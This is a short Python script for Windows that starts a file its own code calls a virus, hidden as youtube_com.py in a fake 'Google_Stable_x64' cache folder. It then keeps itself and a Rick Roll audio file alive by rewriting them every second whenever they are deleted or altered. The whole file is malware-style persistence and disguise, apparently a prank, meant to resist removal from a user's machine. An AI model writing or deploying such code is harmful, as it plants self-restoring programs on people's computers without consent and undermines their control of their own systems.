import os, time
import subprocess

home_dir = r"C:\Users\justlinux"  # Use raw string


files_to_backup = [
  (__file__, __file__),
  (rf"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com-watch-dQw4w9WgXcQ.mp3", 
   rf"{home_dir}\Music\youtube_com-watch-dQw4w9WgXcQ.mp3")
]

backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]

virus_path = rf"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com.py"
subprocess.Popen(['python', virus_path])

while True:
  for index, file_paths in enumerate(files_to_backup):
    backup = backuped_files[index]
    for path in file_paths:
      if not os.path.exists(path) or open(path, "rb").read() != backup:
        with open(path, "wb") as file:
          file.write(backup)
  time.sleep(1)
